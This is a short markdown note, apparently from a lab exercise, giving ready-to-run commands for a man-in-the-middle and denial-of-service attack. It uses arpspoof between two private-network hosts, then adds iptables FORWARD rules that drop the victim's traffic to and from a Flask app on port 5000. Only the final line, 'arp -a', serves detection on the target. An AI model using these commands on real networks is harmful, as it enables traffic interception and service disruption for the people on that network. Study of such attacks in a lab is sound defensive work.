# man in the middle and DoS attack
 
## Command to start the arp spoof 
sudo arpspoof -i ens33 -t 10.0.0.45 -r 10.0.0.133

## Commands to filter out packets, dropping the packets for and from the victim specific to the flask application
sudo iptables -A FORWARD -s 10.0.0.133 -d 10.0.0.45 -p tcp --sport 5000 -j DROP
sudo iptables -A FORWARD -s 10.0.0.45 -d 10.0.0.133 -p tcp --dport 5000 -j DROP


## This command is the command to run on target vm to check if an arp spoof has occurred.  
arp -a
